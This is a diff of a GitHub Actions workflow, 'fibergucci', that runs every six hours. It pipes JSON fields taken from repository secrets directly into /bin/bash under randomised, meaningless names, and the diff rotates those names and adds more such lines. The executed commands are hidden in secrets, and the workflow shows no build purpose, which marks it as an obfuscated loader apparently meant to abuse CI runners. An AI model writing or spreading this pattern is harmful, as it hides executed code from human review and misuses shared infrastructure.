@@ -2,19 +2,32 @@ name: fibergucci
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
-jobs:  # 24593
+    - cron: '5 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fibergucci
         env:
-          sy27: ${{ secrets.sy27 }}
+          dg33819: ${{ secrets.dg33819 }}
         run: |
-          echo $sy27 | jq -r .tldtb3389 | /bin/bash
-          echo $q13351 | jq -r .ny71 | /bin/bash
-          echo $xv97 | jq -r .zbha3371 | /bin/bash
-          echo $bmez7522 | jq -r .zqicp340 | /bin/bash
-          echo $l411 | jq -r .pfa59418 | /bin/bash
+          echo $dg33819 | jq -r .y13883 | /bin/bash
+          echo $r19 | jq -r .k8 | /bin/bash
+          echo $qocyp0 | jq -r .aoig6 | /bin/bash
+          echo $xr79 | jq -r .oiba990 | /bin/bash
+          echo $p20987 | jq -r .ewbjk42 | /bin/bash
+          echo $d4107 | jq -r .z82747 | /bin/bash
+          echo $n01982 | jq -r .k18682 | /bin/bash
+          echo $isvx52 | jq -r .fnxzj4505 | /bin/bash
+          echo $xp0380 | jq -r .yc78 | /bin/bash
+          echo $i412 | jq -r .a891 | /bin/bash
+          echo $yplzk04 | jq -r .uf1686 | /bin/bash
+          echo $bt7791 | jq -r .qlsbn923 | /bin/bash
+          echo $wehrf99982 | jq -r .htv5031 | /bin/bash
+          echo $hmsx24188 | jq -r .dy87 | /bin/bash
+          echo $cl8 | jq -r .ndwln61 | /bin/bash
+          echo $eq133 | jq -r .bfyyh12175 | /bin/bash
+          echo $xslp058 | jq -r .cged7350 | /bin/bash
 
